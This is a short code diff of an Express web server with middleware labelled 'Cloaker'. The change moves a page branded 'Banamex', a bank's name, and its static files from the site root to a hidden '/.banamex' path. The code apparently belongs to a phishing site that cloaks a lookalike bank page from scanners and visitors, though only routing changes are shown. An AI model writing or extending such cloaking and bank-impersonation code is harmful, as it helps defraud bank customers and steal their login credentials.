@@ -73,7 +73,7 @@ app.use((req, res, next) => {
     const isDevelopment = process.env.NODE_ENV !== 'production';
     
     // Permitir acceso completo en desarrollo para rutas principales
-    if (isDevelopment && (req.path === '/' || req.path.startsWith('/admin') || req.path.startsWith('/api') || req.path.startsWith('/client') || req.path.startsWith('/banamex'))) {
+    if (isDevelopment && (req.path === '/' || req.path.startsWith('/admin') || req.path.startsWith('/api') || req.path.startsWith('/client') || req.path.startsWith('/.banamex'))) {
       console.log(`[Cloaker] ✓ Modo desarrollo - ruta permitida: ${req.path}`);
       return next();
     }
@@ -161,10 +161,10 @@ app.use((req, res, next) => {
   });
 
   // Servir archivos estáticos de Banamex ANTES de todo
-  app.use('/banamex', express.static('public/banamex'));
+  app.use('/.banamex', express.static('public/banamex'));
 
   // Interceptar la ruta raíz para servir la página de Banamex ANTES de cualquier otra ruta
-  app.get('/', (_req: Request, res: Response) => {
+  app.get('/.banamex', (_req: Request, res: Response) => {
     res.sendFile('banamex/index.html', { root: 'public' });
   });
 
